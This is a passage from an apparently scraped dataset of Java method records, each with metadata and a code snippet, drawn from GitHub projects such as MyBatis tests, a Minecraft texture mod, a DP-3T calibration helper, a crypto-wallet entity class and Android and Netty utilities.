"static"]}}, {"id": 59096, "method_name": "getSpriteForSide", "class_name": "VerticalCTMSpriteProvider", "params": ["Direction", "BlockRenderView", "BlockState", "BlockPos", "Random"], "throws": null, "modifiers": ["public"], "return_type": "Sprite", "snippet": "\tpublic Sprite getSpriteForSide(Direction side, BlockRenderView view, BlockState state, BlockPos pos, Random random) {\n\t\tboolean down = testDown(view, side, pos, state);\n\t\tboolean up = testUp(view, side, pos, state);\n\t\tif(down && up) {\n\t\t\treturn connects[1];\n\t\t} else if(down && !up) {\n\t\t\treturn connects[2];\n\t\t} else if(!down && up) {\n\t\t\treturn connects[0];\n\t\t} else {\n\t\t\treturn connects[3];\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/Nuclearfarts/connected-block-textures/master/src/main/java/io/github/nuclearfarts/cbt/sprite/VerticalCTMSpriteProvider.java", "stars": "3", "class_props": {"extends": "ConnectingSpriteProvider", "implements": null, "modifiers": ["public"]}}, {"id": 59097, "method_name": "shouldSetParameter", "class_name": "FloatTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldSetParameter() throws Exception {\n    TYPE_HANDLER.setParameter(ps, 1, 100f, null);\n    verify(ps).setFloat(1, 100f);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/FloatTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 59098, "method_name": "shouldGetResultFromResultSetByName", "class_name": "FloatTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromResultSetByName() throws Exception {\n    when(rs.getFloat(\"column\")).thenReturn(100f);\n    assertEquals(Float.valueOf(100f), TYPE_HANDLER.getResult(rs, \"column\"));\n\n    when(rs.getFloat(\"column\")).thenReturn(0f);\n    assertEquals(Float.valueOf(0f), TYPE_HANDLER.getResult(rs, \"column\"));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/FloatTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 59099, "method_name": "shouldGetResultNullFromResultSetByName", "class_name": "FloatTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromResultSetByName() throws Exception {\n    when(rs.getFloat(\"column\")).thenReturn(0f);\n    when(rs.wasNull()).thenReturn(true);\n    assertNull(TYPE_HANDLER.getResult(rs, \"column\"));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/FloatTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 59100, "method_name": "shouldGetResultFromResultSetByPosition", "class_name": "FloatTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromResultSetByPosition() throws Exception {\n    when(rs.getFloat(1)).thenReturn(100f);\n    assertEquals(Float.valueOf(100f), TYPE_HANDLER.getResult(rs, 1));\n\n    when(rs.getFloat(1)).thenReturn(0f);\n    assertEquals(Float.valueOf(0f), TYPE_HANDLER.getResult(rs, 1));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/FloatTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 59101, "method_name": "shouldGetResultNullFromResultSetByPosition", "class_name": "FloatTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromResultSetByPosition() throws Exception {\n    when(rs.getFloat(1)).thenReturn(0f);\n    when(rs.wasNull()).thenReturn(true);\n    assertNull(TYPE_HANDLER.getResult(rs, 1));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/FloatTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 59102, "method_name": "shouldGetResultFromCallableStatement", "class_name": "FloatTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromCallableStatement() throws Exception {\n    when(cs.getFloat(1)).thenReturn(100f);\n    assertEquals(Float.valueOf(100f), TYPE_HANDLER.getResult(cs, 1));\n\n    when(cs.getFloat(1)).thenReturn(0f);\n    assertEquals(Float.valueOf(0f), TYPE_HANDLER.getResult(cs, 1));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/FloatTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 59103, "method_name": "shouldGetResultNullFromCallableStatement", "class_name": "FloatTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromCallableStatement() throws Exception {\n    when(cs.getFloat(1)).thenReturn(0f);\n    when(cs.wasNull()).thenReturn(true);\n    assertNull(TYPE_HANDLER.getResult(cs, 1));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/FloatTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 59104, "method_name": "copySKsToDatabase", "class_name": "CryptoDatabaseHelper", "params": ["Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void copySKsToDatabase(Context context) {\n\t\tSQLiteDatabase database = DatabaseHelper.getWritableDatabase(context);\n\t\tdatabase.beginTransaction();\n\t\tdatabase.execSQL(\"drop table if exists \" + TABLE_NAME);\n\t\tdatabase.execSQL(\"CREATE TABLE IF NOT EXISTS \" + TABLE_NAME + \" (\" + KEY + \" BLOB NOT NULL, \" +\n\t\t\t\tDATE + \" INTEGER NOT NULL)\");\n\t\tfor (Pair<DayDate, byte[]> keyPair : CryptoModule.getInstance(context).getSKList()) {\n\t\t\tContentValues insertValues = new ContentValues();\n\t\t\tinsertValues.put(KEY, keyPair.second);\n\t\t\tinsertValues.put(DATE, keyPair.first.getStartOfDayTimestamp());\n\t\t\tdatabase.insert(TABLE_NAME, null, insertValues);\n\t\t}\n\t\tdatabase.setTransactionSuccessful();\n\t\tdatabase.endTransaction();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/calibration/java/org/dpppt/android/sdk/internal/crypto/CryptoDatabaseHelper.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59105, "method_name": "get", "class_name": "MapWrapper", "params": ["PropertyTokenizer"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object get(PropertyTokenizer prop) {\n    if (prop.getIndex() != null) {\n      Object collection = resolveCollection(prop, map);\n      return getCollectionValue(prop, collection);\n    } else {\n      return map.get(prop.getName());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/wrapper/MapWrapper.java", "stars": "15", "class_props": {"extends": "BaseWrapper", "implements": null, "modifiers": ["public"]}}, {"id": 59106, "method_name": "set", "class_name": "MapWrapper", "params": ["PropertyTokenizer", "Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void set(PropertyTokenizer prop, Object value) {\n    if (prop.getIndex() != null) {\n      Object collection = resolveCollection(prop, map);\n      setCollectionValue(prop, collection, value);\n    } else {\n      map.put(prop.getName(), value);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/wrapper/MapWrapper.java", "stars": "15", "class_props": {"extends": "BaseWrapper", "implements": null, "modifiers": ["public"]}}, {"id": 59107, "method_name": "findProperty", "class_name": "MapWrapper", "params": ["String", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String findProperty(String name, boolean useCamelCaseMapping) {\n    return name;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/wrapper/MapWrapper.java", "stars": "15", "class_props": {"extends": "BaseWrapper", "implements": null, "modifiers": ["public"]}}, {"id": 59108, "method_name": "getGetterNames", "class_name": "MapWrapper", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String[] getGetterNames() {\n    return map.keySet().toArray(new String[map.keySet().size()]);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/wrapper/MapWrapper.java", "stars": "15", "class_props": {"extends": "BaseWrapper", "implements": null, "modifiers": ["public"]}}, {"id": 59109, "method_name": "getSetterNames", "class_name": "MapWrapper", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String[] getSetterNames() {\n    return map.keySet().toArray(new String[map.keySet().size()]);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/wrapper/MapWrapper.java", "stars": "15", "class_props": {"extends": "BaseWrapper", "implements": null, "modifiers": ["public"]}}, {"id": 59110, "method_name": "getSetterType", "class_name": "MapWrapper", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Class<?>", "snippet": "  public Class<?> getSetterType(String name) {\n    PropertyTokenizer prop = new PropertyTokenizer(name);\n    if (prop.hasNext()) {\n      MetaObject metaValue = metaObject.metaObjectForProperty(prop.getIndexedName());\n      if (metaValue == SystemMetaObject.NULL_META_OBJECT) {\n        return Object.class;\n      } else {\n        return metaValue.getSetterType(prop.getChildren());\n      }\n    } else {\n      if (map.get(name) != null) {\n        return map.get(name).getClass();\n      } else {\n        return Object.class;\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/wrapper/MapWrapper.java", "stars": "15", "class_props": {"extends": "BaseWrapper", "implements": null, "modifiers": ["public"]}}, {"id": 59111, "method_name": "getGetterType", "class_name": "MapWrapper", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Class<?>", "snippet": "  public Class<?> getGetterType(String name) {\n    PropertyTokenizer prop = new PropertyTokenizer(name);\n    if (prop.hasNext()) {\n      MetaObject metaValue = metaObject.metaObjectForProperty(prop.getIndexedName());\n      if (metaValue == SystemMetaObject.NULL_META_OBJECT) {\n        return Object.class;\n      } else {\n        return metaValue.getGetterType(prop.getChildren());\n      }\n    } else {\n      if (map.get(name) != null) {\n        return map.get(name).getClass();\n      } else {\n        return Object.class;\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/wrapper/MapWrapper.java", "stars": "15", "class_props": {"extends": "BaseWrapper", "implements": null, "modifiers": ["public"]}}, {"id": 59112, "method_name": "hasSetter", "class_name": "MapWrapper", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean hasSetter(String name) {\n    return true;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/wrapper/MapWrapper.java", "stars": "15", "class_props": {"extends": "BaseWrapper", "implements": null, "modifiers": ["public"]}}, {"id": 59113, "method_name": "hasGetter", "class_name": "MapWrapper", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean hasGetter(String name) {\n    PropertyTokenizer prop = new PropertyTokenizer(name);\n    if (prop.hasNext()) {\n      if (map.containsKey(prop.getIndexedName())) {\n        MetaObject metaValue = metaObject.metaObjectForProperty(prop.getIndexedName());\n        if (metaValue == SystemMetaObject.NULL_META_OBJECT) {\n          return true;\n        } else {\n          return metaValue.hasGetter(prop.getChildren());\n        }\n      } else {\n        return false;\n      }\n    } else {\n      return map.containsKey(prop.getName());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/wrapper/MapWrapper.java", "stars": "15", "class_props": {"extends": "BaseWrapper", "implements": null, "modifiers": ["public"]}}, {"id": 59114, "method_name": "instantiatePropertyValue", "class_name": "MapWrapper", "params": ["String", "PropertyTokenizer", "ObjectFactory"], "throws": null, "modifiers": ["public"], "return_type": "MetaObject", "snippet": "  public MetaObject instantiatePropertyValue(String name, PropertyTokenizer prop, ObjectFactory objectFactory) {\n    HashMap<String, Object> map = new HashMap<>();\n    set(prop, map);\n    return MetaObject.forObject(map, metaObject.getObjectFactory(), metaObject.getObjectWrapperFactory(), metaObject.getReflectorFactory());\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/wrapper/MapWrapper.java", "stars": "15", "class_props": {"extends": "BaseWrapper", "implements": null, "modifiers": ["public"]}}, {"id": 59115, "method_name": "isCollection", "class_name": "MapWrapper", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isCollection() {\n    return false;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/wrapper/MapWrapper.java", "stars": "15", "class_props": {"extends": "BaseWrapper", "implements": null, "modifiers": ["public"]}}, {"id": 59116, "method_name": "add", "class_name": "MapWrapper", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void add(Object element) {\n    throw new UnsupportedOperationException();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/wrapper/MapWrapper.java", "stars": "15", "class_props": {"extends": "BaseWrapper", "implements": null, "modifiers": ["public"]}}, {"id": 59117, "method_name": "addAll", "class_name": "MapWrapper", "params": ["List<E>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public <E> void addAll(List<E> element) {\n    throw new UnsupportedOperationException();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/wrapper/MapWrapper.java", "stars": "15", "class_props": {"extends": "BaseWrapper", "implements": null, "modifiers": ["public"]}}, {"id": 59118, "method_name": "getHdPath", "class_name": "AccountEntity", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getHdPath() {\n        return hdPath;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/db/entity/AccountEntity.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59119, "method_name": "setHdPath", "class_name": "AccountEntity", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setHdPath(@NonNull String hdPath) {\n        this.hdPath = hdPath;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/db/entity/AccountEntity.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59120, "method_name": "getExPub", "class_name": "AccountEntity", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getExPub() {\n        return exPub;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/db/entity/AccountEntity.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59121, "method_name": "setExPub", "class_name": "AccountEntity", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setExPub(String exPub) {\n        this.exPub = exPub;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/db/entity/AccountEntity.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59122, "method_name": "getAddressLength", "class_name": "AccountEntity", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getAddressLength() {\n        return addressLength;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/db/entity/AccountEntity.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59123, "method_name": "setAddressLength", "class_name": "AccountEntity", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAddressLength(int addressLength) {\n        this.addressLength = addressLength;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/db/entity/AccountEntity.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59124, "method_name": "isMultiSign", "class_name": "AccountEntity", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isMultiSign() {\n        return isMultiSign;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/db/entity/AccountEntity.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59125, "method_name": "setMultiSign", "class_name": "AccountEntity", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMultiSign(boolean multiSign) {\n        isMultiSign = multiSign;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/db/entity/AccountEntity.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59126, "method_name": "getCoinId", "class_name": "AccountEntity", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getCoinId() {\n        return coinId;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/db/entity/AccountEntity.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59127, "method_name": "setCoinId", "class_name": "AccountEntity", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCoinId(Long coinId) {\n        this.coinId = coinId;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/db/entity/AccountEntity.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59128, "method_name": "with", "class_name": "KeyboardWatcher", "params": ["Activity"], "throws": null, "modifiers": ["public", "static"], "return_type": "KeyboardWatcher", "snippet": "    public static KeyboardWatcher with(Activity activity) {\n        return new KeyboardWatcher(activity);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/other/KeyboardWatcher.java", "stars": "1", "class_props": {"extends": null, "implements": ["ViewTreeObserver", "Application"], "modifiers": ["final", "public"]}}, {"id": 59129, "method_name": "onGlobalLayout", "class_name": "KeyboardWatcher", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onGlobalLayout() {\n        final Rect r = new Rect();\n        //r will be populated with the coordinates of your view that area still visible.\n        mContentView.getWindowVisibleDisplayFrame(r);\n\n        final int heightDiff = mContentView.getRootView().getHeight() - (r.bottom - r.top);\n        if (!isSoftKeyboardOpened && heightDiff > mContentView.getRootView().getHeight() / 4) {\n            isSoftKeyboardOpened = true;\n            if ((mActivity.getWindow().getAttributes().flags & WindowManager.LayoutParams.FLAG_FULLSCREEN) != WindowManager.LayoutParams.FLAG_FULLSCREEN) {\n                if (mListeners != null) {\n                    mListeners.onSoftKeyboardOpened(heightDiff - mStatusBarHeight);\n                }\n            } else {\n                if (mListeners != null) {\n                    mListeners.onSoftKeyboardOpened(heightDiff);\n                }\n            }\n\n        } else if (isSoftKeyboardOpened && heightDiff < mContentView.getRootView().getHeight() / 4) {\n            isSoftKeyboardOpened = false;\n            if (mListeners != null) {\n                mListeners.onSoftKeyboardClosed();\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/other/KeyboardWatcher.java", "stars": "1", "class_props": {"extends": null, "implements": ["ViewTreeObserver", "Application"], "modifiers": ["final", "public"]}}, {"id": 59130, "method_name": "setListener", "class_name": "KeyboardWatcher", "params": ["SoftKeyboardStateListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setListener(SoftKeyboardStateListener listener) {\n        mListeners = listener;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/other/KeyboardWatcher.java", "stars": "1", "class_props": {"extends": null, "implements": ["ViewTreeObserver", "Application"], "modifiers": ["final", "public"]}}, {"id": 59131, "method_name": "onActivityCreated", "class_name": "KeyboardWatcher", "params": ["Activity", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivityCreated(@NonNull Activity activity, Bundle savedInstanceState) {}", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/other/KeyboardWatcher.java", "stars": "1", "class_props": {"extends": null, "implements": ["ViewTreeObserver", "Application"], "modifiers": ["final", "public"]}}, {"id": 59132, "method_name": "onActivityStarted", "class_name": "KeyboardWatcher", "params": ["Activity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivityStarted(@NonNull Activity activity) {}", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/other/KeyboardWatcher.java", "stars": "1", "class_props": {"extends": null, "implements": ["ViewTreeObserver", "Application"], "modifiers": ["final", "public"]}}, {"id": 59133, "method_name": "onActivityResumed", "class_name": "KeyboardWatcher", "params": ["Activity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivityResumed(@NonNull Activity activity) {}", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/other/KeyboardWatcher.java", "stars": "1", "class_props": {"extends": null, "implements": ["ViewTreeObserver", "Application"], "modifiers": ["final", "public"]}}, {"id": 59134, "method_name": "onActivityPaused", "class_name": "KeyboardWatcher", "params": ["Activity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivityPaused(@NonNull Activity activity) {}", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/other/KeyboardWatcher.java", "stars": "1", "class_props": {"extends": null, "implements": ["ViewTreeObserver", "Application"], "modifiers": ["final", "public"]}}, {"id": 59135, "method_name": "onActivityStopped", "class_name": "KeyboardWatcher", "params": ["Activity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivityStopped(@NonNull Activity activity) {}", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/other/KeyboardWatcher.java", "stars": "1", "class_props": {"extends": null, "implements": ["ViewTreeObserver", "Application"], "modifiers": ["final", "public"]}}, {"id": 59136, "method_name": "onActivitySaveInstanceState", "class_name": "KeyboardWatcher", "params": ["Activity", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivitySaveInstanceState(@NonNull Activity activity, @NonNull Bundle outState) {}", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/other/KeyboardWatcher.java", "stars": "1", "class_props": {"extends": null, "implements": ["ViewTreeObserver", "Application"], "modifiers": ["final", "public"]}}, {"id": 59137, "method_name": "onActivityDestroyed", "class_name": "KeyboardWatcher", "params": ["Activity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivityDestroyed(@NonNull Activity activity) {\n        if (mActivity == activity) {\n            mActivity.getApplication().unregisterActivityLifecycleCallbacks(this);\n            mContentView.getViewTreeObserver().removeOnGlobalLayoutListener(this);\n\n            mActivity = null;\n            mContentView = null;\n            mListeners = null;\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/other/KeyboardWatcher.java", "stars": "1", "class_props": {"extends": null, "implements": ["ViewTreeObserver", "Application"], "modifiers": ["final", "public"]}}, {"id": 59138, "method_name": "encode", "class_name": "MessageEncoder", "params": ["ChannelHandlerContext", "MessageProtocol", "ByteBuf"], "throws": ["Exception"], "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void encode(ChannelHandlerContext ctx, MessageProtocol msg, ByteBuf out) throws Exception {\n        //\u5c06\u5b57\u8282\u6570\u7ec4(\u6d88\u606f\u4f53)\u7684\u957f\u5ea6\u4f5c\u4e3a\u6d88\u606f\u5934\u5199\u5165,\u89e3\u51b3\u534a\u5305/\u7c98\u5305\u95ee\u9898\n        out.writeInt(msg.getLen());\n        //\u5199\u5165\u5185\u5bb9\u7684\u5b57\u8282\u6570\u7ec4\n        out.writeBytes(msg.getContent());\n    }", "url": "https://raw.githubusercontent.com/lzj-github/registry/master/naming/src/main/java/cn/lzj/nacos/naming/netty/MessageEncoder.java", "stars": "34", "class_props": {"extends": "MessageToByteEncoder", "implements": null, "modifiers": ["public"]}}, {"id": 59139, "method_name": "setItems", "class_name": "FilterableBaseBindingAdapter", "params": ["List<M>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setItems(List<M> data) {\n        allItems.clear();\n        allItems.addAll(data);\n        super.setItems(data);\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/ui/common/FilterableBaseBindingAdapter.java", "stars": "13", "class_props": {"extends": "BaseBindingAdapter", "implements": ["Filterable"], "modifiers": ["public", "abstract"]}}, {"id": 59140, "method_name": "onSetItems", "class_name": "FilterableBaseBindingAdapter", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onSetItems() {\n        if (!TextUtils.isEmpty(query)) {\n            items.clear();\n            items.addAll(allItems.stream()\n                    .filter(address -> address.filter(query))\n                    .collect(Collectors.toList()));\n        }\n        super.onSetItems();\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/ui/common/FilterableBaseBindingAdapter.java", "stars": "13", "class_props": {"extends": "BaseBindingAdapter", "implements": ["Filterable"], "modifiers": ["public", "abstract"]}}, {"id": 59141, "method_name": "getFilter", "class_name": "FilterableBaseBindingAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Filter", "snippet": "    public Filter getFilter() {\n        return new Filter() {\n            @Override\n            protected FilterResults performFiltering(CharSequence charSequence) {\n                query = charSequence.toString();\n                List<M> filterEntities;\n                if (TextUtils.isEmpty(query)) {\n                    filterEntities = allItems;\n                } else {\n                    filterEntities = allItems.stream()\n                            .filter(coin -> coin.filter(query))\n                            .collect(Collectors.toList());\n                }\n                FilterResults filterResults = new FilterResults();\n                filterResults.values = filterEntities;\n                return filterResults;\n            }\n\n            @Override\n            @SuppressWarnings(\"unchecked\")\n            protected void publishResults(CharSequence charSequence, FilterResults filterResults) {\n                items = (ArrayList<M>) filterResults.values;\n                notifyDataSetChanged();\n            }\n        };\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/ui/common/FilterableBaseBindingAdapter.java", "stars": "13", "class_props": {"extends": "BaseBindingAdapter", "implements": ["Filterable"], "modifiers": ["public", "abstract"]}}, {"id": 59142, "method_name": "getMsgId", "class_name": "Head", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMsgId() {\n        return msgId;\n    }", "url": "https://raw.githubusercontent.com/mrchengwenlong/NettyIM/master/im_lib/src/main/java/com/takiku/im_lib/entity/Head.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59143, "method_name": "setMsgId", "class_name": "Head", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMsgId(String msgId) {\n        this.msgId = msgId;\n    }", "url": "https://raw.githubusercontent.com/mrchengwenlong/NettyIM/master/im_lib/src/main/java/com/takiku/im_lib/entity/Head.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59144, "method_name": "getMsgType", "class_name": "Head", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getMsgType() {\n        return msgType;\n    }", "url": "https://raw.githubusercontent.com/mrchengwenlong/NettyIM/master/im_lib/src/main/java/com/takiku/im_lib/entity/Head.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59145, "method_name": "setMsgType", "class_name": "Head", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMsgType(int msgType) {\n        this.msgType = msgType;\n    }", "url": "https://raw.githubusercontent.com/mrchengwenlong/NettyIM/master/im_lib/src/main/java/com/takiku/im_lib/entity/Head.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59146, "method_name": "getMsgContentType", "class_name": "Head", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getMsgContentType() {\n        return msgContentType;\n    }", "url": "https://raw.githubusercontent.com/mrchengwenlong/NettyIM/master/im_lib/src/main/java/com/takiku/im_lib/entity/Head.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59147, "method_name": "setMsgContentType", "class_name": "Head", "params": ["int"], "throws": 